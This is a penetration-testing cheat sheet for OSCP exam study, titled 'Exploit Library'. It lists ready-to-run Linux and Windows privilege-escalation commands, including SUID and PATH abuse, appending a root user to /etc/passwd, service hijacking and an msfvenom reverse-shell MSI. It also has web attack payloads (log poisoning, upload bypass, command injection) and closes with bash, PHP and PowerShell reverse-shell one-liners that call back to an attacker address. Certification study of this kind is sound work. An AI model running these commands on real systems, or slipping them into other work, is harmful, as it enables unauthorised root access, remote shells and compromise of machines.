######################################################################
# 10 – EXPLOIT LIBRARY (OSCP 2025)
######################################################################

===========================================================
# 1. Linux Exploit Patterns
===========================================================

-------------------------------
# 1.1 SUID Binary Abuse
-------------------------------
find / -perm -4000 -type f 2>/dev/null

# Common exploitable binaries:
/usr/bin/find
/usr/bin/python
/usr/bin/perl
/usr/bin/bash
/usr/bin/vim
/usr/bin/nmap

# Example (find):
find . -exec /bin/bash -p \; -quit

-------------------------------
# 1.2 Cron Jobs
-------------------------------
cat /etc/crontab
ls -la /etc/cron.*

# Wildcard exploit:
/path/to/script.sh
touch /tmp/payload.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/payload.sh

-------------------------------
# 1.3 PATH Hijacking
-------------------------------
echo "/bin/bash" > /tmp/ping
chmod +x /tmp/ping
export PATH=/tmp:$PATH
sudo ping

-------------------------------
# 1.4 Capabilities
-------------------------------
getcap -r / 2>/dev/null

# Python3 SETUID trick:
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

-------------------------------
# 1.5 Writable /etc/passwd
-------------------------------
openssl passwd -1 "password"

echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd  
su root2

===========================================================
# 2. Windows Exploit Patterns
===========================================================

-------------------------------
# 2.1 Unquoted Service Path
-------------------------------
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"

# If path contains spaces and isn’t quoted:
C:\Program Files\My App\Service.exe
→ place rev.exe as “C:\Program.exe”

-------------------------------
# 2.2 Weak Service Permissions
-------------------------------
accesschk64.exe -uwcqv username *

sc config VulnService binPath= "C:\rev.exe"
sc start VulnService

-------------------------------
# 2.3 AlwaysInstallElevated
-------------------------------
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
reg query HKLM\Software\Policies\Microsoft\Windows\Installer  

# Exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$localip LPORT=4444 -f msi > exploit.msi  
msiexec /quiet /qn /i exploit.msi

-------------------------------
# 2.4 DLL Hijacking
-------------------------------
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

# Drop malicious DLL where app loads from:
copy evil.dll "C:\App\"

-------------------------------
# 2.5 SeImpersonatePrivilege (PrintSpoofer)
-------------------------------
whoami /priv

PrintSpoofer64.exe -i -c cmd

===========================================================
# 3. Web Exploits
===========================================================

-------------------------------
# 3.1 LFI to RCE (Log Poisoning)
-------------------------------
User-Agent: <?php system($_GET['cmd']); ?>

http://$targetip/vuln?page=/var/log/apache2/access.log&cmd=id

-------------------------------
# 3.2 File Upload Bypass
-------------------------------
filename.php  
filename.php.jpg  
filename.phtml  
filename.php%00.jpg  

Content-Type: image/jpeg

-------------------------------
# 3.3 Command Injection
-------------------------------
; id  
&& whoami  
| uname -a  

Example:
http://$targetip/ping.php?host=8.8.8.8;id

===========================================================
# 4. Useful Reverse Shell Payloads
===========================================================

-------------------------------
# Bash
-------------------------------
bash -i >& /dev/tcp/$localip/4444 0>&1

-------------------------------
# PHP
-------------------------------
<?php system($_GET['cmd']); ?>

-------------------------------
# PowerShell
-------------------------------
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('$localip',4444); ..."

--------------------------------------------------------

######################################################################
# END OF 10_EXPLOIT_LIBRARY.TXT
######################################################################
